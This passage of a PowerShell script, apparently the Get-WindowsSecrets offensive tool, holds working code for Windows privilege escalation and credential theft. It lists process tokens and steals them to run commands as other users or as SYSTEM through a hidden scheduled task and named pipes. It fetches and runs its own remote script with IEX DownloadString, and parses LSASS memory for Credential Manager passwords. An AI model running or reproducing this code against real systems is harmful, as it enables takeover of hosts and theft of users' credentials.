	}

	return $False
}

function ListSessionTokens
{
	Write-Host ("`n[===] Listing Session Tokens [===]")

	# Load Tokens functions
	LoadTokensAPI

	# Enable require privilege: SeDebugPrivilege
	If (-not (EnablePrivilege "SeDebugPrivilege"))
	{
		Write-Host ("[-] Failed to enable SeDebugPrivilege`n")
		return
	}

	# Get current proccess ID and session ID
	$CurProcID = [System.Diagnostics.Process]::GetCurrentProcess().Id
	$CurSessionID = 0
	$Res = [TokensAPI]::ProcessIdToSessionId($CurProcID, [ref]$CurSessionID)

	# Enumerate all processes
	$ArrayMaxProcesses = 100
	$ArrayBytesSize = $ArrayMaxProcesses * [System.Runtime.InteropServices.Marshal]::SizeOf((New-Object UInt32))
	$ProcessIds = New-Object UInt32[] $ArrayMaxProcesses
	$BytesCopied = 0
	$Succeeded = [TokensAPI]::EnumProcesses($ProcessIds, $ArrayBytesSize, [ref]$BytesCopied)
	If (-not $Succeeded)
	{
		Write-Host ("[-] EnumProcesses() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
		return
	}
	$NbProcesses = $BytesCopied / [System.Runtime.InteropServices.Marshal]::SizeOf((New-Object UInt32))

	If ($NbProcesses -eq 0)
	{
		Write-Host ("[-] Failed to enumerate any process`n")
		return
	}

	Write-Host ("[+] Format = ProcessID:SessionID:Domain:UserName:SID:LogonID:TokenType:LogonType")

	# Open each process
	For ($i = 0; $i -lt $NbProcesses; $i += 1)
	{
		# Get this process session ID
		$SessionID = 0
		$Res = [TokensAPI]::ProcessIdToSessionId($ProcessIds[$i], [ref]$SessionID)

		$ProcHandle = [TokensAPI]::OpenProcess([TokensAPI+ProcessAccessFlags]::PROCESS_QUERY_INFORMATION, $False, $ProcessIds[$i])
		If ($ProcHandle.ToInt64())
		{
			$TokenHandle = New-Object IntPtr
			$Succeeded = [TokensAPI]::OpenProcessToken($ProcHandle, [TokensAPI]::TOKEN_READ -bor [TokensAPI]::TOKEN_QUERY, [ref]$TokenHandle)
			If ($Succeeded)
			{
				# Get token information
				$TokenInfoLength = 0

				### TokenUser: SIDPtr to string SID ###
				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenUser, 0, $TokenInfoLength, [ref]$TokenInfoLength)
				If (-not $Succeeded)
				{
					If ([TokensAPI]::GetLastError() -ne [TokensAPI]::ERROR_INSUFFICIENT_BUFFER)
					{
						$Discard = [TokensAPI]::CloseHandle($ProcHandle)
						$Discard = [TokensAPI]::CloseHandle($TokenHandle)
						Continue
					}
				}

				[IntPtr]$TokenInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenInfoLength)
				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenUser, $TokenInfoPtr, $TokenInfoLength, [ref]$TokenInfoLength)
				If (-not $Succeeded)
				{
					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
					Continue
				}

				$TokenInfo = New-Object TokensAPI+TOKEN_USER
				$Cast = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenInfoPtr, [Type]$TokenInfo.GetType())

				$SIDPtr = $Cast.User.Sid
				$SIDPtrString = 0
				$Succeeded = [TokensAPI]::ConvertSidToStringSid($SIDPtr, [ref]$SIDPtrString)
				If (-not $Succeeded)
				{
					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
					Continue
				}
				$SID = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($SIDPtrString)
				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)

				### TokenStatistics: AuthenticationID, LogonID, TokenType ###
				$TokenInfoLength = 0
				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenStatistics, 0, $TokenInfoLength, [ref]$TokenInfoLength)
				If (-not $Succeeded)
				{
					If ([TokensAPI]::GetLastError() -ne [TokensAPI]::ERROR_INSUFFICIENT_BUFFER)
					{
						$Discard = [TokensAPI]::CloseHandle($ProcHandle)
						$Discard = [TokensAPI]::CloseHandle($TokenHandle)
						Continue
					}
				}

				[IntPtr]$TokenInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenInfoLength)
				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenStatistics, $TokenInfoPtr, $TokenInfoLength, [ref]$TokenInfoLength)
				If (-not $Succeeded)
				{
					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
					Continue
				}

				$TokenInfo = New-Object TokensAPI+TOKEN_STATISTICS
				$Cast = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenInfoPtr, [Type]$TokenInfo.GetType())
				$LogonID = $Cast.AuthenticationId.LowPart
				$TokenType = $Cast.TokenType
				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)

				### SID to UserName/Domain ###
				$cchName = 0
				$cchReferencedDomainName = 0
				$peUse = New-Object TokensAPI+SID_NAME_USE
				$Succeeded = [TokensAPI]::LookupAccountSidW($Null, $SIDPtr, $Null, [ref]$cchName, $Null, [ref]$cchReferencedDomainName, [ref]$peUse)
				If (-not $Succeeded)
				{
					If ([TokensAPI]::GetLastError() -ne [TokensAPI]::ERROR_INSUFFICIENT_BUFFER)
					{
						$Discard = [TokensAPI]::CloseHandle($ProcHandle)
						$Discard = [TokensAPI]::CloseHandle($TokenHandle)
						Continue
					}
				}

				$UserName = New-Object Text.StringBuilder $cchName
				$Domain = New-Object Text.StringBuilder $cchReferencedDomainName
				$Succeeded = [TokensAPI]::LookupAccountSidW($Null, $SIDPtr, $UserName, [ref]$cchName, $Domain, [ref]$cchReferencedDomainName, [ref]$peUse)
				If (-not $Succeeded)
				{
					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
					Continue
				}

				### Get LogonType ###
				$LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type](New-Object TokensAPI+LUID).GetType()))
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($Cast.AuthenticationId, $LuidPtr, $False)

				[IntPtr]$LogonSessionDataPtr = [IntPtr]::Zero
				$ReturnVal = [TokensAPI]::LsaGetLogonSessionData($LuidPtr, [Ref]$LogonSessionDataPtr)
				If ($ReturnVal -ne 0 -and $LogonSessionDataPtr -eq [IntPtr]::Zero)
				{
					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
					$Discard = [TokensAPI]::CloseHandle($LuidPtr)
					$Discard = [TokensAPI]::CloseHandle($LogonSessionDataPtr)
					Continue
				}
				Else
				{
					$LogonSessionData = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LogonSessionDataPtr, [Type](New-Object TokensAPI+SECURITY_LOGON_SESSION_DATA).GetType())
					$LogonType = $LogonSessionData.LogonType
				}

				$Discard = [TokensAPI]::CloseHandle($ProcHandle)
				$Discard = [TokensAPI]::CloseHandle($TokenHandle)
				$Discard = [TokensAPI]::CloseHandle($LuidPtr)
				$Discard = [TokensAPI]::CloseHandle($LogonSessionDataPtr)

				# ProcessID:SessionID:Domain:UserName:SID:LogonID:TokenType:LogonType
				Write-Host ("[+] {0}:{1}:{2}:{3}:{4}:{5}:{6}:{7}" -f ($ProcessIds[$i], $SessionID, $Domain, $UserName, $SID, $LogonID, $TokenType, $LogonType))
			}
		}
	}

	return
}

function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $ImpersonateCommand)
{
	If ((-not $ProcID) -or (-not $Method))
	{
		Write-Host ("`n[-] You must provide ProcID and Method parameters`n" -f ($SIDToImpersonate))
		return
	}

	Write-Host ("`n[+] Try to impersonate Session Token of process ID = {0}" -f ($ProcID))
	$ProcFound = $False

	# Load Tokens functions
	LoadTokensAPI

	# Enable require privilege: SeDebugPrivilege
	If (-not (EnablePrivilege "SeDebugPrivilege"))
	{
		Write-Host ("[-] Failed to enable SeDebugPrivilege`n")
		return
	}

	# Enumerate all processes
	$ArrayMaxProcesses = 100
	$ArrayBytesSize = $ArrayMaxProcesses * [System.Runtime.InteropServices.Marshal]::SizeOf((New-Object UInt32))
	$ProcessIds = New-Object UInt32[] $ArrayMaxProcesses
	$BytesCopied = 0
	$Succeeded = [TokensAPI]::EnumProcesses($ProcessIds, $ArrayBytesSize, [ref]$BytesCopied)
	If (-not $Succeeded)
	{
		Write-Host ("[-] EnumProcesses() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
		return
	}
	$NbProcesses = $BytesCopied / [System.Runtime.InteropServices.Marshal]::SizeOf((New-Object UInt32))

	If ($NbProcesses -eq 0)
	{
		Write-Host ("[-] Failed to enumerate any processes`n")
		return
	}

	# Open each process
	For ($i = 0; $i -lt $NbProcesses; $i += 1)
	{
		If ($ProcID -eq $ProcessIds[$i])
		{
			$ProcFound = $True
			$ProcHandle = [TokensAPI]::OpenProcess([TokensAPI+ProcessAccessFlags]::PROCESS_QUERY_INFORMATION, $False, $ProcessIds[$i])
			If (-not $ProcHandle.ToInt64())
			{
				Write-Host ("[-] OpenProcess() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
				return
			}

			$TokenHandle = New-Object IntPtr
			$Succeeded = [TokensAPI]::OpenProcessToken($ProcHandle, [TokensAPI]::TOKEN_DUPLICATE -bor [TokensAPI]::TOKEN_READ -bor [TokensAPI]::TOKEN_QUERY, [ref]$TokenHandle)
			If (-not $Succeeded)
			{
				Write-Host ("[-] OpenProcessToken() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
				$Discard = [TokensAPI]::CloseHandle($ProcHandle)
				return
			}

			$DupToken = New-Object IntPtr
			$lpTokenAttributes = New-Object TokensAPI+SECURITY_ATTRIBUTES
			$Succeeded = [TokensAPI]::DuplicateTokenEx($TokenHandle, [TokensAPI]::TOKEN_ALL_ACCESS, [ref]$lpTokenAttributes, [TokensAPI+SECURITY_IMPERSONATION_LEVEL]::SecurityImpersonation, [TokensAPI+TOKEN_TYPE]::TokenPrimary, [ref]$DupToken)
			If (-not $Succeeded)
			{
				Write-Host ("[-] DuplicateTokenEx() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
				$Discard = [TokensAPI]::CloseHandle($ProcHandle)
				$Discard = [TokensAPI]::CloseHandle($TokenHandle)
				return
			}

			If ($Method -eq "ImpersonateLoggedOnUser")
			{
				Write-Host ("[-] Using ImpersonateLoggedOnUser() method: New procs/threads will use calling process token")
				$Succeeded = [TokensAPI]::ImpersonateLoggedOnUser($DupToken)
				If (-not $Succeeded)
				{
					Write-Host ("[-] ImpersonateLoggedOnUser() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
				}
				Else
				{
					Write-Host ("[+] Successfully impersonated token of requested process ID with ImpersonateLoggedOnUser()")
					Write-Host ("[+] Running pseudo-shell as {0}\{1}" -f ([Environment]::UserDomainName, [Environment]::UserName))
					While ($True)
					{
						$Command = Read-Host -Prompt '$PS>'
						If (($Command -eq "Exit") -or ($Command -eq "exit")) { Break }
						IEX $Command
					}
				}
			}
			Else
			{
				If ($Method -eq "CreateProcessWithToken")
				{
					# This method allow to spawn a graphical process
					# When impersonating another user than NT\SYSTEM, this user will not have full permission on the Window Station and Desktop objects and the GUI will be partially rendered
					# Thus It is required to add an ACL to grant the "Everyone" group full control of the current Windows Station and Desktop
					# https://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/
					$Succeeded = Set-DesktopACLs
					If (-not $Succeeded)
					{
						$Discard = [TokensAPI]::CloseHandle($ProcHandle)
						$Discard = [TokensAPI]::CloseHandle($TokenHandle)
						$Discard = [TokensAPI]::CloseHandle($DupToken)
						return
					}

					$lpStartupInfo = New-Object TokensAPI+STARTUPINFO
					$lpProcessInformation = New-Object TokensAPI+PROCESS_INFORMATION
					$CmdLinePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("C:\\Windows\\System32\\cmd.exe")
					$Succeeded = [TokensAPI]::CreateProcessWithTokenW($DupToken, 0, 0, $CmdLinePtr, 0, 0, 0, [ref]$lpStartupInfo, [ref]$lpProcessInformation)
					If (-not $Succeeded)
					{
						Write-Host ("[-] CreateProcessWithTokenW() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
					}
					Else
					{
						Write-Host ("[+] Successfully impersonated token of requested process ID with CreateProcessWithTokenW()`n")
					}

					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($CmdLinePtr)
				}
				ElseIf ($Method -eq "CreateProcessAsUser")
				{
					# This method allow to spawn a terminal process
					# It require NT\SYSTEM access and SeAssignPrimaryTokenPrivilege for calling CreateProcessAsUserW()
					If ($IsSystem -ne 'True')
					{
						Write-Host ("[+] Create System process with ScheduledTasks and System Named Pipes")
						$StartNamedPipes = '$systemPipeIn = new-object System.IO.Pipes.NamedPipeServerStream ''systemPipeIn'',''In''
											$systemPipeIn.WaitForConnection()
											$reader = New-Object System.IO.StreamReader($systemPipeIn)
											while (($cmd = $reader.ReadLine()) -ne $Null)
											{
												If (($cmd -eq ''Exit'') -or ($cmd -eq ''exit''))
												{
													Break
												}

												#IEX $cmd
												($res = IEX $cmd) 2>&1>$Null
												$res >> ''C:\Windows\Temp\test.txt''
											}
											$reader.Close()
											$systemPipeIn.Close()'

						$TaskName = "MyTask"
						$User = "NT AUTHORITY\SYSTEM"
						$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoExit -ExecutionPolicy Bypass -WindowStyle Hidden -Command $StartNamedPipes"
						$MyTask = Register-ScheduledTask -TaskName $TaskName -User $User -Action $Action -RunLevel Highest -Force
						Start-ScheduledTask $TaskName

						$systemPipeIn = new-object System.IO.Pipes.NamedPipeClientStream '.','systemPipeIn','Out'
						$systemPipeIn.Connect()
						$systemWriter = New-Object System.IO.StreamWriter($systemPipeIn)
						Write-Host ("[+] Connected to System Named Pipes")
						Write-Host ("[+] Ask new System process to impersonate token and create Token Named Pipes" -f ($ProcID))

						$Command = 'IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/YRazafim/Get-WindowsSecrets/main/Get-WindowsSecrets.ps1")'
						$systemWriter.WriteLine($Command)
						$systemWriter.Flush()

						$Command = "ImpersonateToken -ProcID $ProcID -Method CreateProcessAsUser -IsSystem 'True' -ConnectTokenPipe 'False' -ImpersonateCommand 'Null'"
						$systemWriter.WriteLine($Command)
						$systemWriter.Flush()

						Write-Host ("[+] Connect to Token Named Pipes")

						$tokenPipeIn = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeIn','Out'
						$tokenPipeOut = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeOut','In'
						$tokenPipeIn.Connect(); $tokenPipeOut.Connect()
						$tokenReader = New-Object System.IO.StreamReader($tokenPipeOut)
						$tokenWriter = New-Object System.IO.StreamWriter($tokenPipeIn)
						If ($ImpersonateCommand -eq 'Null')
						{
							While ($True)
							{
								$Command = Read-Host -Prompt '$PS>'
								If (($Command -eq "Exit") -or ($Command -eq "exit"))
								{
									$tokenWriter.WriteLine($Command)
									$tokenWriter.Flush()
									Break
								}

								$tokenWriter.WriteLine($Command)
								$tokenWriter.Flush()
								$res = $tokenReader.ReadLine()
								If ($res)
								{
									$out = $res.Replace("||||||", "`n")
									Write-Host ($out)
								}
							}
						}
						Else
						{
							Write-Host ("[+] Executing command")
							$tokenWriter.WriteLine($ImpersonateCommand)
							$tokenWriter.Flush()
							$res = $tokenReader.ReadLine()
							If ($res)
							{
								$out = $res.Replace("||||||", "`n")
								Write-Host ($out)
							}
						}

						$tokenReader.Close()
						$tokenWriter.Close()
						$tokenPipeIn.Close()
						$tokenPipeOut.Close()
						$systemWriter.Close()
						$systemPipeIn.Close()
						$DeleteTask = Unregister-ScheduledTask -TaskName $TaskName -Confirm:$False -AsJob
					}
					Else
					{
						If (-not (EnablePrivilege "SeAssignPrimaryTokenPrivilege"))
						{
							Write-Host ("[-] Failed to enable SeAssignPrimaryTokenPrivilege`n")
							$Discard = [TokensAPI]::CloseHandle($ProcHandle)
							$Discard = [TokensAPI]::CloseHandle($TokenHandle)
							$Discard = [TokensAPI]::CloseHandle($DupToken)
							return
						}

						$lpStartupInfo = New-Object TokensAPI+STARTUPINFO
						$lpProcessInformation = New-Object TokensAPI+PROCESS_INFORMATION
						$StartNamedPipes = '$tokenPipeOut = new-object System.IO.Pipes.NamedPipeServerStream ''tokenPipeOut'',''Out''
											$tokenPipeIn = new-object System.IO.Pipes.NamedPipeServerStream ''tokenPipeIn'',''In''
											$tokenPipeIn.WaitForConnection(); $tokenPipeOut.WaitForConnection();
											$reader = New-Object System.IO.StreamReader($tokenPipeIn)
											$writer = New-Object System.IO.StreamWriter($tokenPipeOut)
											while (($cmd = $reader.ReadLine()) -ne $null)
											{
												If (($cmd -eq ''Exit'') -or ($cmd -eq ''exit''))
												{
													Break
												}

												($res = IEX $cmd) 2>&1>$Null
												If ($res)
												{
													If ($res.GetType().Name -eq ''String'')
													{
														$out = $res
													}
													Else
													{
														$out = '''' + ($res -Join ''||||||'')
													}
												}
												Else
												{
													$out = ''''
												}
												$out = $out.Trim()

												$writer.WriteLine($out)
												$writer.Flush()
											}
											$reader.Close()
											$writer.Close()
											$tokenPipeIn.Close()
											$tokenPipeOut.Close()'

						$CmdLinePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoExit -WindowStyle Hidden -ExecutionPolicy Bypass -Command $StartNamedPipes")
						$Succeeded = [TokensAPI]::CreateProcessAsUserW($DupToken, 0, $CmdLinePtr, 0, 0, $False, 0, 0, 0, [ref]$lpStartupInfo, [ref]$lpProcessInformation)
						If (-not $Succeeded)
						{
							Write-Host ("[-] CreateProcessAsUserW() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
						}
						Else
						{
							Write-Host ("[+] Successfully impersonated token of requested process ID with CreateProcessAsUserW()")

							<# Allow to directly interact with newly created process and wait It
							$SpawnProc = Get-CIMInstance -ClassName win32_process -filter "parentprocessid = '$($([System.Diagnostics.Process]::GetCurrentProcess().Id))'" | Select ProcessId
							Wait-Process -Id $SpawnProc.ProcessId
							#>

							If ($ConnectTokenPipe -eq 'True')
							{
								$tokenPipeIn = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeIn','Out'
								$tokenPipeOut = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeOut','In'
								$tokenPipeIn.Connect(); $tokenPipeOut.Connect()
								$tokenReader = New-Object System.IO.StreamReader($tokenPipeOut)
								$tokenWriter = New-Object System.IO.StreamWriter($tokenPipeIn)

								While ($True)
								{
									$Command = Read-Host -Prompt '$PS>'
									If (($Command -eq "Exit") -or ($Command -eq "exit"))
									{
										$tokenWriter.WriteLine($Command)
										$tokenWriter.Flush()
										Break
									}

									$tokenWriter.WriteLine($Command)
									$tokenWriter.Flush()
									$res = $tokenReader.ReadLine()
									If ($res)
									{
										$out = $res.Replace("||||||", "`n")
										Write-Host ($out)
									}
								}

								$tokenReader.Close()
								$tokenWriter.Close()
								$tokenPipeIn.Close()
								$tokenPipeOut.Close()
							}
							ElseIf ($ImpersonateCommand -ne 'Null')
							{
								$tokenPipeIn = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeIn','Out'
								$tokenPipeOut = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeOut','In'
								$tokenPipeIn.Connect(); $tokenPipeOut.Connect()
								$tokenReader = New-Object System.IO.StreamReader($tokenPipeOut)
								$tokenWriter = New-Object System.IO.StreamWriter($tokenPipeIn)

								Write-Host ("[+] Executing command")
								$tokenWriter.WriteLine($ImpersonateCommand)
								$tokenWriter.Flush()
								$res = $tokenReader.ReadLine()
								If ($res)
								{
									$out = $res.Replace("||||||", "`n")
									Write-Host ($out)
								}

								$tokenReader.Close()
								$tokenWriter.Close()
								$tokenPipeIn.Close()
								$tokenPipeOut.Close()
							}
						}

						[System.Runtime.InteropServices.Marshal]::FreeHGlobal($CmdLinePtr)
					}
				}
				Else
				{
					Write-Host ("[-] Unknown method '{0}' to impersonate Session Tokens`n" -f ($Method))
				}
			}

			$Discard = [TokensAPI]::CloseHandle($ProcHandle)
			$Discard = [TokensAPI]::CloseHandle($TokenHandle)
			$Discard = [TokensAPI]::CloseHandle($DupToken)
			return
		}
	}

	If (-not $ProcFound)
	{
		Write-Host ("[-] No process with ID {0} found`n" -f ($ProcID))
	}

	return
}

<#########>
<# LSASS #>
<#########>

<### Templates depending on OS for parsing secrets stored into lsass.exe ###>

<#
	MSV and Credman Templates
#>
function LSASS-Get-MSVSecrets($Dump, $LSADecryptor)
{
	<### Credman Templates ###>

	$CredmanTemplate = @{}
	$CredmanTemplate["Signature"] = $Null
	$CredmanTemplate["First_Entry_Offset"] = $Null
	$CredmanTemplate["List_Entry"] = $Null

	function KIWI_CREDMAN_List_Entry_60_X86($Handle, $Pages, $AddrStruct, $StructToWrite)
	{
		$StructToWrite["FBLink_Func"] = (Get-Item "function:KIWI_CREDMAN_List_Entry_60").ScriptBlock

		$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages ($AddrStruct - 32)
		$Buff = $Buff[$OffAddr..($OffAddr + $Buff.Length - 1)]
		$BaseAddr += $OffAddr
		$Offset = 0

		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["cbEncPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["encPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "PWSTR"
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk3"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["UserName"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["cbUserName"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Flink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Blink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Type"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Type"]
		$StructToWrite["Unk5"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Server1"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Server1"]
		$StructToWrite["Unk6"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk7"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk8"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk9"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk10"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["User"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["User"]
		$StructToWrite["Unk11"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Server2"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Server2"]

		return
	}

	function KIWI_CREDMAN_List_Entry_X86($Handle, $Pages, $AddrStruct, $StructToWrite)
	{
		$StructToWrite["FBLink_Func"] = (Get-Item "function:KIWI_CREDMAN_List_Entry").ScriptBlock

		$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages ($AddrStruct - 32)
		$Buff = $Buff[$OffAddr..($OffAddr + $Buff.Length - 1)]
		$BaseAddr += $OffAddr
		$Offset = 0

		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["cbEncPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["encPassword"] = $StructToWrite["encPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "PWSTR"
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk3"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["UserName"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["cbUserName"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Flink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Blink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk4"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Unk4"]
		$StructToWrite["Type"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Type"]
		$StructToWrite["Unk5"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Server1"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Server1"]
		$StructToWrite["Unk6"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk7"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk8"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk9"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk10"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["User"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["User"]
		$StructToWrite["Unk11"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Server2"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Server2"]

		return
	}

	function KIWI_CREDMAN_List_Entry_60($Handle, $Pages, $AddrStruct, $StructToWrite)
	{
		$StructToWrite["FBLink_Func"] = (Get-Item "function:KIWI_CREDMAN_List_Entry_60").ScriptBlock

		$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages ($AddrStruct - 56)
		$Buff = $Buff[$OffAddr..($OffAddr + $Buff.Length - 1)]
		$BaseAddr += $OffAddr
		$Offset = 0

		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["cbEncPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["encPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk3"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["UserName"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["cbUserName"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Flink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Blink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Type"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Type"]
		$StructToWrite["Unk5"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Server1"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Server1"]
		$StructToWrite["Unk6"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk7"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk8"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk9"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk10"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["User"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["User"]
		$StructToWrite["Unk11"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
